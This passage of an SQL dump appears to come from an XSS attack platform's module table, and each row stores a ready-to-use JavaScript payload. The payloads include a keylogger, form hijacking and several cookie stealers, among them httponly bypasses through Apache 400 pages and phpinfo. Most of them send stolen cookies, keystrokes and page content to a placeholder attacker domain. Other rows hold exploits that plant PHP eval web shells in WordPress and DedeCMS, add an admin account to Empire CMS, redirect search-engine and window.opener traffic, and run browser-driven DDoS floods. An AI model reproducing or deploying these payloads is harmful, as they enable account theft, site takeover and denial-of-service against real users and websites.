name=_&#039;+x.rdm()+&#039;_&gt;&#039;);\r\n    form.target=iframe.name;\r\n    setTimeout(function(){\r\n      x.bind(iframe,&#039;load&#039;,function(){\r\n        form.action=form.old_action,form.target=form.old_target,form.onsubmit=null,form.submit();\r\n     })\r\n    },30);\r\n  };\r\n  \r\n  /*\r\n   * 函数代理\r\n  */\r\n x.proxy=function(fn,before,after){\r\n    return function(){\r\n      before&amp;&amp;before.apply(this,arguments);\r\n     var result = fn.apply(this,arguments);\r\n      after&amp;&amp;after.apply(this,arguments);\r\n     return result;\r\n    }\r\n };\r\n  \r\n  return x;\r\n}();', 0, 1, '一些常用XSS模块', 1, 1, 'uncia', 1441714758),
(64, 1, '表单劫持', '["Location","Locationtop","Data"]', '["Formname"]', 'var url=location.href; //获取当前url地址\r\nvar topurl=top.location.href;//获取顶级窗口url地址\r\nxss.xform(document.forms[&#039;{set.formname}&#039;],&#039;https://替换成你的域名/form.php?id={projectId}&amp;url=&#039;+url+&#039;&amp;topurl=&#039;+topurl);//劫持表单 发送到 form.php  用于接收', 0, 1, '需要勾选xss.js 0.2.2模块才能使用\r\n\r\nformname为表单的name属性', 1, 1, 'uncia', 1438386579),
(69, 1, '键盘记录2', '[]', '["t","s"]', 'var k__=[];function k_p(e){var currKey=0,e=e||event;currKey=e.keyCode||e.which||e.charCode;switch(currKey){case 8:case 9:case 13:case 32:case 37:case 38:case 39:case 40:case 46:k_n=&quot;&quot;;break;default:k_n=String.fromCharCode(currKey);break}k__.push(k_n)}function k_d(e){var e=e||event;var currKey=e.keyCode||e.which||e.charCode;if((currKey&gt;7&amp;&amp;currKey&lt;14)||(currKey&gt;31&amp;&amp;currKey&lt;47)){switch(currKey){case 8:k_n=&quot;[退格]&quot;;break;case 9:k_n=&quot;[制表]&quot;;break;case 13:k_n=&quot;[回车]&quot;;break;case 32:k_n=&quot;[空格]&quot;;break;case 33:k_n=&quot;[PageUp]&quot;;break;case 34:k_n=&quot;[PageDown]&quot;;break;case 35:k_n=&quot;[End]&quot;;break;case 36:k_n=&quot;[Home]&quot;;break;case 37:k_n=&quot;[方向键左]&quot;;break;case 38:k_n=&quot;[方向键上]&quot;;break;case 39:k_n=&quot;[方向键右]&quot;;break;case 40:k_n=&quot;[方向键下]&quot;;break;case 46:k_n=&quot;[删除]&quot;;break;default:k_n=&quot;&quot;;break}k__.push(k_n)}}function k_u(e){}function s_d(d){new Image().src=&quot;https://替换成你的域名/index.php?do=selfxss&amp;act=g&amp;id={projectId}&amp;c=!!!cookie:&quot;+document.cookie+&quot;!!!keyboard:&quot;+d}document.onkeypress=k_p;document.onkeydown=k_d;document.onkeyup=k_u;var t__={set.t}&gt;5?{set.t}:5;setInterval(function(){if(k__.length&gt;0){s_d(k__.join(&quot;{set.s}&quot;||&quot;&quot;));k__=[]}},t__*1000);', 0, 1, '键盘记录，定时发送到自己的邮箱,t为定时秒数，最小为5秒,\r\ns为键盘单个字符间的分隔符', 1, 1, 'uncia', 1441714920),
(70, 1, '内网ip获得', '[]', '[]', '  var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;\r\nif (RTCPeerConnection) (function() {\r\n    var rtc = new RTCPeerConnection({\r\n        iceServers:[]\r\n    });\r\n    if (1 || window.mozRTCPeerConnection) {\r\n        rtc.createDataChannel(&quot;&quot;, {\r\n            reliable:false\r\n        });\r\n    }\r\n    rtc.onicecandidate = function(evt) {\r\n        if (evt.candidate) grepSDP(&quot;a=&quot; + evt.candidate.candidate);\r\n    };\r\n    rtc.createOffer(function(offerDesc) {\r\n        grepSDP(offerDesc.sdp);\r\n        rtc.setLocalDescription(offerDesc);\r\n    }, function(e) {\r\n        console.warn(&quot;offer failed&quot;, e);\r\n    });\r\n    var addrs = Object.create(null);\r\n    addrs[&quot;0.0.0.0&quot;] = false;\r\n    function updateDisplay(newAddr) {\r\n        if (newAddr in addrs) return; else addrs[newAddr] = true;\r\n        var displayAddrs = Object.keys(addrs).filter(function(k) {\r\n            return addrs[k];\r\n        });\r\nnew Image().src=&quot;https://替换成你的域名/index.php?do=selfxss&amp;act=g&amp;id={projectId}&amp;c=!!!cookie:&quot;+document.cookie+&quot;!!!ip:&quot;+String(displayAddrs);\r\n\r\n    }\r\n    function grepSDP(sdp) {\r\n        var hosts = [];\r\n        sdp.split(&quot;\\r\\n&quot;).forEach(function(line) {\r\n            if (~line.indexOf(&quot;a=candidate&quot;)) {\r\n                var parts = line.split(&quot; &quot;), addr = parts[4], type = parts[7];\r\n                if (type === &quot;host&quot;) updateDisplay(addr);\r\n            } else if (~line.indexOf(&quot;c=&quot;)) {\r\n                var parts = line.split(&quot; &quot;), addr = parts[2];\r\n                updateDisplay(addr);\r\n            }\r\n        });\r\n    }\r\n})(); ', 0, 1, '', 1, 1, 'uncia', 1441715088),
(71, 1, 'WordPress 4.2 ', '[]', '[]', 'var xmlHttp;var content404,theme,_wpnonce,content ;\r\n\r\nfunction createXMLHttpRequest() {\r\n\r\nif (window.ActiveXObject) {\r\n\r\nxmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\r\n\r\n}\r\n\r\nelse if (window.XMLHttpRequest) {\r\n\r\nxmlHttp = new XMLHttpRequest();\r\n\r\n}\r\n\r\n}\r\n\r\nfunction doRequest(url) {\r\n\r\ncreateXMLHttpRequest();\r\n\r\nxmlHttp.onreadystatechange = handleStateChange;\r\n\r\nxmlHttp.open(&quot;GET&quot;, url, true);\r\n\r\nxmlHttp.send(null);\r\n\r\n}\r\n\r\nfunction handleStateChange() {\r\n\r\nif(xmlHttp.readyState == 4) {\r\n\r\n//alert(xmlHttp.responseText)\r\n\r\ncontent404 = xmlHttp.responseText;\r\n\r\ntheme = new RegExp(&quot;&lt;input type=\\&quot;hidden\\&quot; name=\\&quot;theme\\&quot; value=\\&quot;(.+?)\\&quot; /&gt;&quot;).exec(content404)[1]\r\n\r\n_wpnonce = new RegExp(&quot;&lt;input type=\\&quot;hidden\\&quot; id=\\&quot;_wpnonce\\&quot; name=\\&quot;_wpnonce\\&quot; value=\\&quot;(.+?)\\&quot; /&gt;&quot;).exec(content404)[1]\r\n\r\ncontent = new RegExp(&quot;(:?aria-describedby=\\&quot;newcontent-description\\&quot;&gt;)([^&lt;]+)&quot;).exec(content404)[2]+&quot;&lt;script language=\\&quot;php\\&quot;&gt;fputs(fopen(chr(46).chr(47).chr(65).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(65).chr(93).chr(41).chr(59).chr(63).chr(62));&lt;/script&gt;&quot;\r\n\r\n//Post code\r\n\r\nvar data = &quot;_wpnonce=&quot;+_wpnonce+&quot;&amp;_wp_http_referer=&quot;+window.location.pathname+&quot;&amp;newcontent=&quot;+escape(content)+&quot;&amp;action=update&amp;file=404.php&amp;theme=&quot;+theme+&quot;&amp;scrollto=10&amp;docs-list=&amp;submit=submit&quot;\r\n\r\ndoPostRequest(&quot;./wp-admin/theme-editor.php&quot;,data)\r\n\r\n}\r\n\r\n}\r\n\r\ndoRequest(&quot;./wp-admin/theme-editor.php?file=404.php&quot;)\r\n\r\nfunction doPostRequest(url,data) {\r\n\r\ncreateXMLHttpRequest();\r\n\r\nxmlHttp.onreadystatechange = handleStateChangePost;\r\n\r\nxmlHttp.open(&quot;POST&quot;, url, true);\r\n\r\nxmlHttp.send(data);\r\n\r\n}\r\n\r\nfunction handleStateChangePost() {\r\n\r\nif(xmlHttp.readyState == 4) {\r\n\r\n//get 404\r\n\r\ndoRequest2(&quot;./index.php?p=9999999999999998888&quot;)\r\n\r\n}\r\n\r\n}\r\n\r\nfunction doRequest2(url) {\r\n\r\ncreateXMLHttpRequest();\r\n\r\nxmlHttp.onreadystatechange = handleStateChange3;\r\n\r\nxmlHttp.open(&quot;GET&quot;, url, true);\r\n\r\nxmlHttp.send(null);\r\n\r\n}\r\n\r\nfunction handleStateChange3()\r\n\r\n{\r\n\r\nif(xmlHttp.readyState == 4) {\r\n\r\n//(function(){(new Image).src=&quot;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;shell=&quot;+document.location.origin+document.location.pathname+&quot;./A.php AAA&quot;}())\r\n\r\n//(function(){(new Image).src=&#039;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;shell=&#039;+escape(document.location.origin+document.location.pathname+&#039;./A.php&#039;) })()\r\n\r\n(function(){(new Image).src=&#039;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;shell=&#039;+escape(document.location.origin+document.location.pathname+&#039;./A.php&#039;)+&#039;&amp;location=&#039;+escape((function(){try{return document.location.href}catch(e){return &#039;&#039;}})())+&#039;&amp;toplocation=&#039;+escape((function(){try{return top.location.href}catch(e){return &#039;&#039;}})())+&#039;&amp;cookie=&#039;+escape((function(){try{return document.cookie}catch(e){return &#039;&#039;}})())+&#039;&amp;opener=&#039;+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#039;&#039;}catch(e){return &#039;&#039;}})())})()\r\n\r\n}\r\n\r\n}', 0, 1, 'WordPress 4.2 Stored Xss Exp\r\nhttp://ha.cker.in/1109.seo', 1, 1, 'uncia', 1441716342),
(79, 1, 'apache httponly new', '[]', '[]', 'function setCookies (good) {\r\n    /*apache server limit 8192*/\r\n    var str = &quot;&quot;;\r\n    for (var i=0; i&lt; 819; i++) {\r\n        str += &quot;x&quot;;\r\n    }\r\n    for (i = 0; i &lt; 10; i++) {\r\n        if (good){\r\n            var cookie = &quot;ray&quot;+i+&quot;=expires=&quot;+new Date(+new Date()-1).toUTCString()+&quot;;path=/;&quot;;\r\n        }else{\r\n            var cookie = &quot;ray&quot;+i+&quot;=&quot;+str+&quot;;path=/&quot;;\r\n        }\r\n        document.cookie = cookie;\r\n    }    \r\n}\r\n\r\nfunction parseCookies () {\r\n    if (xhr.readyState === 4 &amp;&amp; xhr.status === 400) {\r\n            var cookie_dit = {};\r\n            var content = xhr.responseText.replace(/\\r|\\n/g,&#039;&#039;).match(/&lt;pre&gt;(.+)&lt;\\/pre&gt;/);\r\n            content = content[1].replace(&quot;Cookie: &quot;, &quot;&quot;);\r\n            cookies = content.replace(/ray\\d=x+;?/g, &#039;&#039;)\r\n            cookie_dit = cookies;\r\n            try { \r\n              var myopener=&#039;&#039;; myopener = window.parent.openner.location;\r\n              var myparent = &#039;&#039;; myparent = window.parent.location;\r\n            } catch(err){\r\n              myopener=&#039;0&#039;;myparent =&#039;0&#039;;\r\n            }\r\n            setCookies(true);\r\n            new Image().src = &#039;https://替换成你的域名/index.php?do=api&amp;id={projectId}&amp;location=&#039;+escape(document.location)+&#039;&amp;toplocation=&#039;+escape(myparent)+&#039;&amp;cookie=&#039;+escape(cookie_dit)+&#039;&amp;opener=&#039;+escape(myopener);\r\n    }\r\n}\r\n\r\nsetCookies();\r\nvar xhr = window.XMLHttpRequest? new XMLHttpRequest() : window.ActiveXObject ? new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) : new XMLHttpRequest();\r\nxhr.onreadystatechange = parseCookies;\r\nxhr.open(&quot;POST&quot;, &quot;/?&quot;+Math.random(), true);\r\nxhr.send(null);', 0, 1, 'apache httponly bypass\r\n\r\n利用apache server head limit 8192字节限制, 从400状态页爆出httponly保护的cookie.\r\n\r\nxsser.me平台httponly模块的一点修改\r\nhttp://bbs.blackbap.org/thread-4724-1-1.html\r\n\r\n', 1, 1, 'uncia', 1449192974),
(72, 232, 'dede', '[]', '[]', 'var pkav={\r\n ajax:function(){\r\n    var xmlHttp;\r\n    try{\r\n      xmlHttp=new XMLHttpRequest();\r\n   }catch (e){\r\n     try{\r\n        xmlHttp=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);\r\n      }catch (e){\r\n       try{\r\n          xmlHttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\r\n       }\r\n       catch (e){\r\n          return false;\r\n       }\r\n     }\r\n   }\r\n   return xmlHttp;\r\n },\r\n  req:function(url,data,method,callback){\r\n   method=(method||&quot;&quot;).toUpperCase();\r\n    method=method||&quot;GET&quot;;\r\n   data=data||&quot;&quot;;\r\n    if(url){\r\n      var a=this.ajax();\r\n      a.open(method,url,true);\r\n      if(method==&quot;POST&quot;){\r\n       a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);\r\n     }\r\n     a.onreadystatechange=function(){\r\n        if (a.readyState==4 &amp;&amp; a.status==200)\r\n       {\r\n         if(callback){\r\n           callback(a.responseText);\r\n         }\r\n       }\r\n     };\r\n      if((typeof data)==&quot;object&quot;){\r\n        var arr=[];\r\n       for(var i in data){\r\n         arr.push(i+&quot;=&quot;+encodeURIComponent(data[i]));\r\n        }\r\n       a.send(arr.join(&quot;&amp;&quot;));\r\n      }else{\r\n        a.send(data||null);\r\n     }\r\n   }\r\n },\r\n  get:function(url,callback){\r\n   this.req(url,&quot;&quot;,&quot;GET&quot;,callback);\r\n  },\r\n  post:function(url,data,callback){\r\n   this.req(url,data,&quot;POST&quot;,callback);\r\n }\r\n};\r\nif(!window.__x){\r\npkav.post(&quot;tpl.php&quot;,&quot;actiondo=edittag&amp;action=savetagfile&amp;filename=adminname.lib.php&amp;content=11&lt;?php eval($_POST[i597]);?&gt;&amp;B1=++%E4%BF%9D+%E5%AD%98++&quot;,function(rs){});\r\npkav.get(&quot;接口地址&quot;,function(rs){});\r\n  window.__x=1;\r\n}', 0, 1, '', 1, 1, 'uncia', 1447465474),
(73, 1, '劫持搜索引擎', '[]', '[]', 'var slyar=document.referrer\r\n\r\nif(slyar.indexOf(&quot;baidu&quot;)&gt;0)\r\nself.location=&quot;http://替换成你的域名&quot;;\r\nelse if(slyar.indexOf(&quot;soso&quot;)&gt;0)\r\nself.location=&quot;http://替换成你的域名&quot;;\r\nelse if(slyar.indexOf(&quot;google&quot;)&gt;0)\r\nself.location=&quot;http://替换成你的域名&quot;;\r\nelse if(slyar.indexOf(&quot;youdao&quot;)&gt;0)\r\nself.location=&quot;http://替换成你的域名&quot;;\r\nelse if(slyar.indexOf(&quot;sogou&quot;)&gt;0)\r\nself.location=&quot;http://替换成你的域名&quot;;', 0, 1, '劫持搜索引擎来路跳转', 1, 1, 'uncia', 1448618515),
(74, 1, '劫持百度搜索引擎', '[]', '[]', 'var slyar=document.referrer;if(slyar.indexOf(&quot;baidu&quot;)&gt;0)self.location=&quot;http://替换成你的域名&quot;;', 0, 1, '劫持百度搜索引擎', 1, 1, 'uncia', 1448618590),
(75, 1, '2345', '[]', '[]', 'window.open(&quot;http://替换成你的域名/?kuncia&quot;);\r\nwindow.open(&quot;http://替换成你的域名/?lm001021&quot;);', 0, 0, '', 0, 0, NULL, 1449061301),
(76, 1, 'getHtmlText', '[]', '["location","cookie","inerhtmltest"]', '(function(){(new Image()).src=&#039;https://替换成你的域名/index.php?do=api&amp;id=\r\n{projectId}&amp;location=&#039;+escape((function(){try{return document.location.href}catch(e){return &#039;&#039;}})\r\n())+&#039;&amp;inerhtmltext=&#039;+escape((function(){try{return document.documentElement.innerHTML}catch(e)\r\n{return &#039;&#039;}})())+&#039;&amp;cookie=&#039;+escape((function(){try{return document.cookie}catch(e){return &#039;&#039;}})());})();\r\n', 0, 1, 'getHtmlText', 1, 1, 'uncia', 1449093337),
(77, 1, '帝国cms加用户', '[]', '[]', 'var pkav={\r\n ajax:function(){\r\n    var xmlHttp;\r\n    try{\r\n      xmlHttp=new XMLHttpRequest();\r\n   }catch (e){\r\n     try{\r\n        xmlHttp=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);\r\n      }catch (e){\r\n       try{\r\n          xmlHttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\r\n       }\r\n       catch (e){\r\n          return false;\r\n       }\r\n     }\r\n   }\r\n   return xmlHttp;\r\n },\r\n  req:function(url,data,method,callback){\r\n   method=(method||&quot;&quot;).toUpperCase();\r\n    method=method||&quot;GET&quot;;\r\n   data=data||&quot;&quot;;\r\n    if(url){\r\n      var a=this.ajax();\r\n      a.open(method,url,true);\r\n      if(method==&quot;POST&quot;){\r\n       a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);\r\n     }\r\n     a.onreadystatechange=function(){\r\n        if (a.readyState==4 &amp;&amp; a.status==200)\r\n       {\r\n         if(callback){\r\n           callback(a.responseText);\r\n         }\r\n       }\r\n     };\r\n      if((typeof data)==&quot;object&quot;){\r\n        var arr=[];\r\n       for(var i in data){\r\n         arr.push(i+&quot;=&quot;+encodeURIComponent(data[i]));\r\n        }\r\n       a.send(arr.join(&quot;&amp;&quot;));\r\n      }else{\r\n        a.send(data||null);\r\n     }\r\n   }\r\n },\r\n  get:function(url,callback){\r\n   this.req(url,&quot;&quot;,&quot;GET&quot;,callback);\r\n  },\r\n  post:function(url,data,callback){\r\n   this.req(url,data,&quot;POST&quot;,callback);\r\n }\r\n};\r\nvar s =top.location.href;\r\nvar xss =(s.substr(0,(s.lastIndexOf(&#039;/&#039;)+1)));\r\nvar adrx1 =xss+&quot;/user/ListUser.php&quot;;\r\nvar adrx2 =xss+&quot;/pub/SetSafe.php&quot;;\r\nif(!window.__x){\r\npkav.post(adrx1,&quot;userid=&amp;oldusername=&amp;enews=AddUser&amp;oldadminclass=&amp;username=robot&amp;password=kakahuxxoo123&amp;repassword=kakahuxxoo123&amp;equestion=0&amp;oldequestion=&amp;eanswer=&amp;truename=&amp;email=&amp;groupid=1&amp;classid=0&amp;styleid=1&amp;openip=&amp;Submit=%CC%E1%BD%BB&quot;,function(rs){});\r\npkav.get(&quot;接口地址&quot;,function(rs){});\r\npkav.post(adrx2,&quot;enews=SetSafe&amp;loginauth=&amp;ecookiernd=ti34ednz3Yu247CjhWzKm3YeFPzCxj&amp;ckhloginfile=0&amp;ckhloginip=0&amp;ckhsession=0&amp;theloginlog=1&amp;thedolog=1&amp;ckfromurl=0&amp;cookiedomain=&amp;cookiepath=%2F&amp;cookievarpre=ynjgk&amp;cookieadminvarpre=aavvq&amp;cookieckrnd=dJ42J3B7tcWZrVXdzejqx9fCnbwuAi&amp;cookieckrndtwo=PvQVUTpvuXCkj7CxjvadtJ3h5pBvhQ&amp;Submit=+%C9%E8+%D6%C3+&quot;,function(rs){});\r\npkav.get(&quot;接口地址&quot;,function(rs){});\r\n  window.__x=1;\r\n}', 0, 1, '', 1, 1, 'uncia', 1449093422),
(78, 1, 'phpinfo httponly', '[]', '[]', 'function createXmlHttp() {\r\n    if (window.XMLHttpRequest) {\r\n       xmlHttp = new XMLHttpRequest();               \r\n    } else {\r\n       xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\r\n    }\r\n}\r\nfunction getS() {\r\n    var Url = &#039;PHPinfo的地址&#039;;\r\n    createXmlHttp();\r\n    xmlHttp.onreadystatechange = writeS; \r\n    xmlHttp.open(&quot;GET&quot;, Url, true);\r\n    xmlHttp.send(null);\r\n}\r\nfunction writeS() {\r\n    if (xmlHttp.readyState == 4) {\r\n     var x = xmlHttp.responseText.match(/&lt;td[^&lt;&gt;]+?&gt;_SERVER\\[&quot;HTTP_COOKIE&quot;\\]&lt;\\/td&gt;&lt;td[^&lt;&gt;]+?&gt;([\\w\\W]+?)&lt;\\/td&gt;/);\r\n     if (x){\r\n        var url = &quot;自己收取cookie的地址&quot; + x; //x 为带httponly cookie的所有cookie\r\n        createXmlHttp();\r\n        xmlHttp.open(&quot;GET&quot;, url, true);\r\n        xmlHttp.send(null);  \r\n       }    \r\n    }\r\n}\r\ngetS();', 0, 1, '如果存在phpinfo 可以从phpinfo 里面获取 httponly cookie', 1, 1, 'uncia', 1449096832);
INSERT INTO `oc_module` (`id`, `userId`, `title`, `keys`, `setkeys`, `code`, `level`, `isOpen`, `description`, `isAudit`, `managerId`, `managerName`, `addTime`) VALUES
(101, 1, 'Js attack', '[]', '[]', 'document.write(&quot;&lt;script src=&#039;http://libs.baidu.com/jquery/2.0.0/jquery.min.js&#039;&gt;\\x3c/script&gt;&quot;);\r\n!window.jQuery &amp;&amp; document.write(&quot;&lt;script src=&#039;http://code.jquery.com/jquery-latest.js&#039;&gt;\\x3c/script&gt;&quot;);\r\nstartime = (new Date).getTime();\r\nvar count = 0;\r\n\r\nfunction unixtime() {\r\n    var a = new Date;\r\n    return Date.UTC(a.getFullYear(), a.getMonth(), a.getDay(), a.getHours(), a.getMinutes(), a.getSeconds()) / 1E3\r\n}\r\nurl_array = [&quot;https://baidu.com&quot;, &quot;https://baidu.com&quot;];\r\nNUM = url_array.length;\r\n\r\nfunction r_send2() {\r\n    var a = unixtime() % NUM;\r\n    get(url_array[a])\r\n}\r\n\r\nfunction get(a) {\r\n    var b;\r\n    $.ajax({\r\n        url: a,\r\n        dataType: &quot;script&quot;,\r\n        timeout: 1E4,\r\n        cache: !0,\r\n        beforeSend: function() {\r\n            requestTime = (new Date).getTime()\r\n        },\r\n        complete: function() {\r\n            responseTime = (new Date).getTime();\r\n            b = Math.floor(responseTime - requestTime);\r\n            3E5 &gt; responseTime - startime &amp;&amp; (r_send(b), count += 1)\r\n        }\r\n    })\r\n}\r\n\r\nfunction r_send(a) {\r\n    setTimeout(&quot;r_send2()&quot;, a)\r\n}\r\nsetTimeout(&quot;r_send2()&quot;, 2E3);', 0, 1, 'cbjs-baidu-github-attack\r\nhttps://github.com/BenMQ/cbjs-baidu-github-attack', 1, 1, 'uncia', 1466708652),
(102, 1, '利用浏览器网页替换', '[]', '[]', 'if (parent.window.opener) {\r\nparent.window.opener.location = &#039;http://替换成你的域名/attack.html&#039;;\r\n};', 0, 1, 'parent.window.opener利用\r\n\r\nhttps://www.t00ls.net/thread-34319-1-1.html', 1, 1, 'uncia', 1466991720),
(103, 1, 'JavascriptCCFool', '[]', '["url"]', 'function imgflood() {\r\nvar pic = new Image()\r\nvar rand = Math.floor(Math.random() * 1000)\r\npic.src = &#039;http://&#039;+{set.url}+&#039;?&#039;+rand+&#039;.&#039;\r\npic.onerror=&quot;imgflood()&quot;\r\npic.onload=&quot;imgflood()&quot;\r\nimgflood()\r\n}\r\nsetInterval(imgflood, 1)\r\nsetInterval(imgflood, 1)\r\nsetInterval(imgflood, 1)', 0, 1, '通过Js发动CC攻击，优化版，真实请求无法防御，此版本不带Cookie验证，无法过安全狗频繁访问提示，参数不需要带http://！注意可能卡死浏览器！', 1, 1, 'uncia', 1466997976),
(104, 1, '跳转百度', '[]', '[]', '&lt;script&gt;window.opener.location=&quot;https://www.baidu.com/&quot;;void(0);&lt;/script&gt;', 0, 1, '', 1, 1, 'uncia', 1466998277),
(105, 1, 'Xss探针模块(新版)', '["domain","screen","browser_name","browser_version","language","Osystem","flash_version","java_version"]', '[]', 'var info = {};var deployJava=function(){function g(n){if(!d.debug){return}if(console.log){console.log(n)}else{alert(n)}}var d={debug:null,version:&quot;20120801&quot;,firefoxJavaVersion:null,oldMimeType:&quot;application/npruntime-scriptable-plugin;DeploymentToolkit&quot;,mimeType:&quot;application/java-deployment-toolkit&quot;,browserName:null,browserName2:null,getJREs:function(){var r=new Array();if(this.isPluginInstalled()){var q=this.getPlugin();var n=q.jvms;for(var p=0;p&lt;n.getLength();p++){r[p]=n.get(p).version}}else{var o=this.getBrowser();if(o==&quot;MSIE&quot;){if(this.testUsingActiveX(&quot;1.7.0&quot;)){r[0]=&quot;1.7.0&quot;}else{if(this.testUsingActiveX(&quot;1.6.0&quot;)){r[0]=&quot;1.6.0&quot;}else{if(this.testUsingActiveX(&quot;1.5.0&quot;)){r[0]=&quot;1.5.0&quot;}else{if(this.testUsingActiveX(&quot;1.4.2&quot;)){r[0]=&quot;1.4.2&quot;}else{if(this.testForMSVM()){r[0]=&quot;1.1&quot;}}}}}}else{if(o==&quot;Netscape Family&quot;){this.getJPIVersionUsingMimeType();if(this.firefoxJavaVersion!=null){r[0]=this.firefoxJavaVersion}else{if(this.testUsingMimeTypes(&quot;1.7&quot;)){r[0]=&quot;1.7.0&quot;}else{if(this.testUsingMimeTypes(&quot;1.6&quot;)){r[0]=&quot;1.6.0&quot;}else{if(this.testUsingMimeTypes(&quot;1.5&quot;)){r[0]=&quot;1.5.0&quot;}else{if(this.testUsingMimeTypes(&quot;1.4.2&quot;)){r[0]=&quot;1.4.2&quot;}else{if(this.browserName2==&quot;Safari&quot;){if(this.testUsingPluginsArray(&quot;1.7.0&quot;)){r[0]=&quot;1.7.0&quot;}else{if(this.testUsingPluginsArray(&quot;1.6&quot;)){r[0]=&quot;1.6.0&quot;}else{if(this.testUsingPluginsArray(&quot;1.5&quot;)){r[0]=&quot;1.5.0&quot;}else{if(this.testUsingPluginsArray(&quot;1.4.2&quot;)){r[0]=&quot;1.4.2&quot;}}}}}}}}}}}}}if(this.debug){for(var p=0;p&lt;r.length;++p){g(&quot;[getJREs()] We claim to have detected Java SE &quot;+r[p])}}return r},getJPIVersionUsingMimeType:function(){for(var o=0;o&lt;navigator.mimeTypes.length;++o){var p=navigator.mimeTypes[o].type;var n=p.match(/^application\\/x-java-applet;jpi-version=(.*)$/);if(n!=null){this.firefoxJavaVersion=n[1];if(&quot;Opera&quot;!=this.browserName2){break}}}},isPluginInstalled:function(){var n=this.getPlugin();if(n&amp;&amp;n.jvms){return true}else{return false}},allowPlugin:function(){this.getBrowser();var n=(&quot;Safari&quot;!=this.browserName2&amp;&amp;&quot;Opera&quot;!=this.browserName2);return n},getPlugin:function(){this.refresh();var n=null;if(this.allowPlugin()){n=document.getElementById(&quot;deployJavaPlugin&quot;)}return n},compareVersionToPattern:function(u,o,q,r){if(u==undefined||o==undefined){return false}var v=&quot;^(\\\\d+)(?:\\\\.(\\\\d+)(?:\\\\.(\\\\d+)(?:_(\\\\d+))?)?)?[        DISCUZ_CODE_0        ]quot;;var w=u.match(v);if(w!=null){var t=0;var x=new Array();for(var p=1;p&lt;w.length;++p){if((typeof w[p]==&quot;string&quot;)&amp;&amp;(w[p]!=&quot;&quot;)){x[t]=w[p];t++}}var n=Math.min(x.length,o.length);if(r){for(var p=0;p&lt;n;++p){if(x[p]&lt;o[p]){return false}else{if(x[p]&gt;o[p]){return true}}}return true}else{for(var p=0;p&lt;n;++p){if(x[p]!=o[p]){return false}}if(q){return true}else{return(x.length==o.length)}}}else{return false}},getBrowser:function(){if(this.browserName==null){var n=navigator.userAgent.toLowerCase();g(&quot;[getBrowser()] navigator.userAgent.toLowerCase() -&gt; &quot;+n);if((n.indexOf(&quot;msie&quot;)!=-1)&amp;&amp;(n.indexOf(&quot;opera&quot;)==-1)){this.browserName=&quot;MSIE&quot;;this.browserName2=&quot;MSIE&quot;}else{if(n.indexOf(&quot;iphone&quot;)!=-1){this.browserName=&quot;Netscape Family&quot;;this.browserName2=&quot;iPhone&quot;}else{if((n.indexOf(&quot;firefox&quot;)!=-1)&amp;&amp;(n.indexOf(&quot;opera&quot;)==-1)){this.browserName=&quot;Netscape Family&quot;;this.browserName2=&quot;Firefox&quot;}else{if(n.indexOf(&quot;chrome&quot;)!=-1){this.browserName=&quot;Netscape Family&quot;;this.browserName2=&quot;Chrome&quot;}else{if(n.indexOf(&quot;safari&quot;)!=-1){this.browserName=&quot;Netscape Family&quot;;this.browserName2=&quot;Safari&quot;}else{if((n.indexOf(&quot;mozilla&quot;)!=-1)&amp;&amp;(n.indexOf(&quot;opera&quot;)==-1)){this.browserName=&quot;Netscape Family&quot;;this.browserName2=&quot;Other&quot;}else{if(n.indexOf(&quot;opera&quot;)!=-1){this.browserName=&quot;Netscape Family&quot;;this.browserName2=&quot;Opera&quot;}else{this.browserName=&quot;?&quot;;this.browserName2=&quot;unknown&quot;}}}}}}}g(&quot;[getBrowser()] Detected browser name:&quot;+this.browserName+&quot;, &quot;+this.browserName2)}return this.browserName},testUsingActiveX:function(n){var p=&quot;JavaWebStart.isInstalled.&quot;+n+&quot;.0&quot;;if(typeof ActiveXObject==&quot;undefined&quot;||!ActiveXObject){g(&quot;[testUsingActiveX()] Browser claims to be IE, but no ActiveXObject object?&quot;);return false}try{return(new ActiveXObject(p)!=null)}catch(o){return false}},testForMSVM:function(){var o=&quot;{08B0E5C0-4FCB-11CF-AAA5-00401C608500}&quot;;if(typeof oClientCaps!=&quot;undefined&quot;){var n=oClientCaps.getComponentVersion(o,&quot;ComponentID&quot;);if((n==&quot;&quot;)||(n==&quot;5,0,5000,0&quot;)){return false}else{return true}}else{return false}},testUsingMimeTypes:function(o){if(!navigator.mimeTypes){g(&quot;[testUsingMimeTypes()] Browser claims to be Netscape family, but no mimeTypes[] array?&quot;);return false}for(var p=0;p&lt;navigator.mimeTypes.length;++p){s=navigator.mimeTypes[p].type;var n=s.match(/^application\\/x-java-applet\\x3Bversion=(1\\.8|1\\.7|1\\.6|1\\.5|1\\.4\\.2)$/);if(n!=null){if(this.compareVersions(n[1],o)){return true}}}return false},testUsingPluginsArray:function(o){if((!navigator.plugins)||(!navigator.plugins.length)){return false}var n=navigator.platform.toLowerCase();for(var p=0;p&lt;navigator.plugins.length;++p){s=navigator.plugins[p].description;if(s.search(/^Java Switchable Plug-in (Cocoa)/)!=-1){if(this.compareVersions(&quot;1.5.0&quot;,o)){return true}}else{if(s.search(/^Java/)!=-1){if(n.indexOf(&quot;win&quot;)!=-1){if(this.compareVersions(&quot;1.5.0&quot;,o)||this.compareVersions(&quot;1.6.0&quot;,o)){return true}}}}}if(this.compareVersions(&quot;1.5.0&quot;,o)){return true}return false},compareVersions:function(q,r){var o=q.split(&quot;.&quot;);var n=r.split(&quot;.&quot;);for(var p=0;p&lt;o.length;++p){o[p]=Number(o[p])}for(var 